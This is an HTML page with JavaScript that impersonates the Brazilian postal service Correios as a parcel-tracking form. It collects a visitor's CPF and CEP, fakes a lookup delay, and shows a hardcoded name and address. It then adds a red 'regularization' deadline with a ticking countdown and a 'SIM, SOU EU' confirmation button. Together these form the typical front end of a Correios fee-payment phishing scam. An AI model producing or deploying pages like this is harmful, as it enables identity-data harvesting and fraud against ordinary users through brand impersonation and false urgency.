<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Rastreamento de Encomenda - Correios</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" />
  <style>
    body {
      background-color: #f1f1f1;
      font-family: Arial, sans-serif;
      color: #003157;
      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
      text-align: left;
    }

    #resultado h2 {
      font-size: 1.8rem;
      font-weight: bold;
      color: #003157;
    }

    #resultado p {
      margin: 0.5rem 0;
    }

    /* Bairro e Rua em branco com fundo azul escuro */
    #res-rua,
    #res-bairro {
      color: white !important;
      background-color: #003157;
      padding: 2px 6px;
      border-radius: 4px;
      display: inline-block;
    }

    /* Prazo centralizado e vermelho */
    #prazo-container {
      margin-top: 1.5rem;
      text-align: center;
      font-weight: 700;
      font-size: 1.3rem;
      color: red;
    }

    /* Botão azul "SIM, SOU EU" */
    #btn-sim-sou-eu {
      margin-top: 2rem;
      display: block;
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 1.1rem;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      text-align: center;
      width: 100%;
      max-width: 250px;
      margin-left: auto;
      margin-right: auto;
      transition: background-color 0.3s ease;
    }

    #btn-sim-sou-eu:hover {
      background-color: #0056b3;
    }
  </style>
</head>

<body>
  <section id="tela-formulario" class="container py-4">
    <h2>Rastreamento de Encomenda - Correios</h2>
    <form id="form-rastreamento">
      <div class="mb-3">
        <label for="cpf">CPF:</label>
        <input type="text" id="cpf" name="cpf" class="form-control" required />
      </div>
      <div class="mb-3">
        <label for="cep">CEP:</label>
        <input type="text" id="cep" name="cep" class="form-control" required />
      </div>
      <button type="submit" class="btn btn-primary">Consultar</button>
    </form>
  </section>

  <section id="loading-container" class="container py-4" style="display: none;">
    <p>Consultando dados... Por favor, aguarde.</p>
  </section>

  <section id="resultado" class="container py-4" style="display: none;">
    <h2>Resultado da Consulta</h2>
    <p><span>Nome:</span> <span id="res-nome"></span></p>
    <p><span>CPF:</span> <span id="res-cpf"></span></p>
    <p><span>CEP:</span> <span id="res-cep"></span></p>
    <p><span>Rua:</span> <span id="res-rua"></span></p>
    <p><span>Bairro:</span> <span id="res-bairro"></span></p>
    <p><span>Cidade:</span> <span id="res-cidade"></span></p>
    <p><span>Estado:</span> <span id="res-estado"></span></p>

    <!-- Prazo com contagem regressiva -->
    <div id="prazo-container">
      Prazo para Regularização: <span id="res-prazo"></span><br />
      <span id="countdown"></span>
    </div>

    <button id="btn-sim-sou-eu" type="button">SIM, SOU EU</button>
  </section>

  <script>
    function formatarCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function formatarCEP(cep) {
      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
    }

    function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
      const prazo = new Date(dataBase);
      prazo.setDate(prazo.getDate() + diasAdicionar);
      prazo.setHours(horas);
      prazo.setMinutes(minutos);
      prazo.setSeconds(0);

      const dd = prazo.getDate().toString().padStart(2, "0");
      const mm = (prazo.getMonth() + 1).toString().padStart(2, "0");
      const yyyy = prazo.getFullYear();
      const hh = prazo.getHours().toString().padStart(2, "0");
      const min = prazo.getMinutes().toString().padStart(2, "0");

      return {
        text: `${dd}/${mm}/${yyyy} às ${hh}:${min}`,
        dateObj: prazo
      };
    }

    function atualizarContagem(prazoDate) {
      const now = new Date().getTime();
      const distance = prazoDate - now;

      if (distance < 0) {
        document.getElementById("countdown").textContent = "Prazo expirado!";
        return;
      }

      const dias = Math.floor(distance / (1000 * 60 * 60 * 24));
      const horas = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutos = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const segundos = Math.floor((distance % (1000 * 60)) / 1000);

      document.getElementById("countdown").textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
    }

    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
      event.preventDefault();

      const cpfRaw = document.getElementById("cpf").value.replace(/\D/g, "");
      const cepRaw = document.getElementById("cep").value.replace(/\D/g, "");

      document.getElementById("loading-container").style.display = "block";
      document.getElementById("resultado").style.display = "none";

      // Simula delay de 2 segundos (substitua por sua consulta real ao backend)
      await new Promise((resolve) => setTimeout(resolve, 2000));

      const prazoData = formatarPrazo(new Date(), 10, 23, 59);

      const dadosPessoa = {
        nome: "Rosiane Oliveira Da Silva",
        cpf: formatarCPF(cpfRaw),
        cep: formatarCEP(cepRaw),
        rua: "Rua das Flores",
        bairro: "Centro",
        cidade: "Porciúncula",
        estado: "RJ",
        prazoRegularizacaoText: prazoData.text,
        prazoRegularizacaoDate: prazoData.dateObj,
      };

      document.getElementById("res-nome").textContent = dadosPessoa.nome;
      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
      document.getElementById("res-cep").textContent = dadosPessoa.cep;
      document.getElementById("res-rua").textContent = dadosPessoa.rua;
      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
      document.getElementById("res-estado").textContent = dadosPessoa.estado;
      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacaoText;

      document.getElementById("loading-container").style.display = "none";
      document.getElementById("tela-formulario").style.display = "none";
      document.getElementById("resultado").style.display = "block";

      atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
      setInterval(() => {
        atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
      }, 1000);
    });
  </script>
</body>

</html>
